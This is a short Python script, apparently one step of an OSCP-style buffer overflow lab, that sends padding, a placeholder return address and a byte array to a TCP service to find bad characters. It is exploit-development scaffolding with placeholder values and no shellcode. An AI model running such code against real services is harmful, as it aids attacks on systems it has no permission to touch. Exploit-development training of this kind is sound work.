#!/usr/bin/env python3
# Removing bad characters to achieve unmodified shell code
# Keep rerunning this program following instructions from 03_Find_BadChars.py
# When the following commands return unmodified move onto 05
# !mona compare -f C:\mona\oscp\bytearray.bin -a <ESP>
# !mona bytearray -b <enumerated bad bytes>

import socket

ip, port = "192.0.0.0", 9999 
command = b""
length = 20
offset =  b"A" * 10
new_eip = b"BBBB"

all_chars = bytearray(range(1, 256))

bad_char = [b"\x00"]

for bad in bad_char:
	all_chars = all_chars.replace(bad, b"")

fill = b"C" * (length - len(new_eip) - len(offset) - len(all_chars))

payload = b"".join([command, offset, new_eip, all_chars, fill])

try:
    with socket.socket() as s:
        s.connect((ip, port))
        s.send(payload + b"\r\n")
        print("Payload sent!")
except:
    print("Could not connect.")

